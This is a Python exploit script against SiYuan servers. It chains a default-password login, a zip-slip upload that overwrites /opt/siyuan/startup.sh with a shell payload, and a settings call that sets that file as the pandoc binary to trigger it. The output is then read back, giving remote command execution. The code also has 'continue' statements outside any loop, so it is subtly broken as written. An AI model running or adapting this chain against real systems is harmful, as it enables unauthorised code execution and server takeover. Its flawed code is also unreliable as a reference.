#!/usr/bin/env python3
import requests
import zipfile
import io
import sys
import time

class SiYuanExploit:
    def __init__(self, base_url, auth_code="SuperSecretPassword"):
        self.base_url = base_url.rstrip('/')
        self.auth_code = auth_code
        self.session = requests.Session()

    def login(self):
        url = f"{self.base_url}/api/system/loginAuth"
        try:
            resp = self.session.post(url, json={"authCode": self.auth_code}, timeout=15)
            result = resp.json()
            if result.get("code") == 0:
                print("[+] Successfully authenticated")
                return True
            else:
                print(f"[-] Authentication failed: {result}")
                return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False

    def create_zip_slip(self, traversal_path):
        payload = b'''#!/bin/sh
echo "pandoc 3.1.0"
echo $(id) > /siyuan/workspace/data/cmd_out.txt 2>/dev/null
'''
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(traversal_path, payload)
        zip_buffer.seek(0)
        return zip_buffer.getvalue()

    def upload_file(self, path, content):
        url = f"{self.base_url}/api/file/putFile"
        files = {'file': ('file', content, 'application/octet-stream')}
        data = {'path': path, 'isDir': 'false'}
        resp = self.session.post(url, files=files, data=data, timeout=15)
        return resp.json()

    def unzip_file(self, zip_path, dest_path):
        url = f"{self.base_url}/api/archive/unzip"
        resp = self.session.post(url, json={"zipPath": zip_path, "path": dest_path}, timeout=15)
        return resp.json()

    def set_pandoc_bin(self, pandoc_path):
        url = f"{self.base_url}/api/setting/setExport"
        data = {
            "paragraphBeginningSpace": False,
            "addTitle": True,
            "blockRefMode": 4,
            "blockEmbedMode": 1,
            "blockRefTextLeft": "",
            "blockRefTextRight": "",
            "tagOpenMarker": "#",
            "tagCloseMarker": "#",
            "fileAnnotationRefMode": 0,
            "pandocBin": pandoc_path,
            "markdownYFM": False
        }
        resp = self.session.post(url, json=data, timeout=15)
        return resp.json()

    def get_file(self, path):
        url = f"{self.base_url}/api/file/getFile"
        resp = self.session.post(url, json={"path": path}, timeout=15)
        return resp

    def exploit(self):
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Auth Code: {self.auth_code}")
        print()

        # Step 1: Authenticate
        if not self.login():
            return None

        target_executable = "/opt/siyuan/startup.sh"
        traversal_path = "../../../../../../opt/siyuan/startup.sh"

        print(f"[*] Trying path traversal: {traversal_path}")

        # Step 2: Create and upload malicious zip
        zip_data = self.create_zip_slip(traversal_path)

        result = self.upload_file("/data/evil.zip", zip_data)
        if result.get("code") != 0:
            print(f"[-] Upload failed: {result}")
            continue

        # Step 3: Zip slip file overwrite
        result = self.unzip_file("/data/evil.zip", "/data/tmp/")
        if result.get("code") != 0:
            print(f"[-] Unzip failed: {result}")
            continue
        print(f"[+] Zip extracted")

        # Step 4: Trigger execution via setExport -> IsValidPandocBin
        print(f"[*] Triggering execution via setExport({target_executable})...")
        self.set_pandoc_bin(target_executable)

        # Step 5: Read the output
        time.sleep(0.5)
        resp = self.get_file("/data/cmd_out.txt")
        if resp.status_code == 200:
            content = resp.text.strip()
            print(f"[+] Out: {content}")
            return content
        return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [auth_code]")
        print(f"Example: {sys.argv[0]} http://target:6806 SuperSecretPassword")
        sys.exit(1)

    target_url = sys.argv[1]
    auth_code = sys.argv[2] if len(sys.argv) > 2 else "SuperSecretPassword"

    exploit = SiYuanExploit(target_url, auth_code)
    res = exploit.exploit()

    if res:
        print("\n[+] Exploit successful!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
